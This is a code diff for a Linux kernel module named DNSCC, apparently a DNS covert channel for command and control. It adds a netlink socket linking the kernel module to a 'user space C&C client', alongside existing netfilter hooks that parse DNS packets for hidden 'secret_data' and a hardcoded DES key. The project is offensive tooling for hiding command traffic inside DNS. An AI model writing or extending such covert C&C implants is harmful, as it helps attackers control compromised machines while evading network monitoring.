@@ -30,6 +30,7 @@
 /* Def */
 #define UDP_HDR_LEN 8
 #define DNS_PORT 53
+#define NETLINK_USER 31
 /* statics */
 static struct nf_hook_ops nfho_send,nfho_recv;
 struct DNS_HEADER {
@@ -55,7 +56,26 @@ struct conn_data{
 	uint32_t connection_id;
 	struct list_head list;
 };
+
 struct conn_data conn_list;
+
+/* Netlink socket for communication between this module and the user space C&C client */
+
+struct sock *nl_sk = NULL;
+
+/* Our netlink function */
+static void dnscc_nl_recv_msg(struct sk_buff *skb){
+	struct nlmsghdr *nlh;
+	int pid;
+	struct sk_buff *skb_out;
+	int msg_size;
+	int res;
+
+	/* decode received message */
+	nlh = (struct nlmsghdr *)skb->data;
+	printk(KERN_INFO "Netlink socket received message data: %s ", (char *)nlmsg_data(nlh));
+}
+
 /* Connection helpers */
 /* Generate an unique connection identifier using the source IP, and the source port
  * and store it in the connection_list 
@@ -151,8 +171,7 @@ static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const 
 	uint8_t action = 5;// dns_action. 5 because, it's invalid by default
 	uint8_t secret_data;
 	uint32_t connection_id;
-	
-/* parse dns packet */
+	/* parse dns packet */
 	/* check if the packet is valid */
 	/* parse IP header */
 	if(iph->protocol != IPPROTO_UDP){
@@ -239,6 +258,13 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 
 /* Load and unload */
 static __init int my_init(void){
+	/* create the netlink socket */
+	nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, 0, dnscc_nl_recv_msg, NULL, THIS_MODULE);
+	if(!nl_sk){
+		printk(KERN_ALERT "[DNSCC] Error while creating netlink socket");
+	}else{
+		printk(KERN_DEBUG "[DNSCC] Netlink socket created");
+	}
 	/* cipher things */
 	int cipher = 1;
 	char des_key[8+1]="AAAAAAAA";
@@ -263,6 +289,8 @@ static __init int my_init(void){
 }
 
 static __exit void my_exit(void){
+	/* release netlink socket */
+	netlink_kernel_release(nl_sk);
 	nf_unregister_hook(&nfho_send);				//unregister netfilter hook
 	printk(KERN_INFO "[DNSCC] dnscc_send kernel module unloaded\n");
 	nf_unregister_hook(&nfho_recv);				//unregister netfilter hook
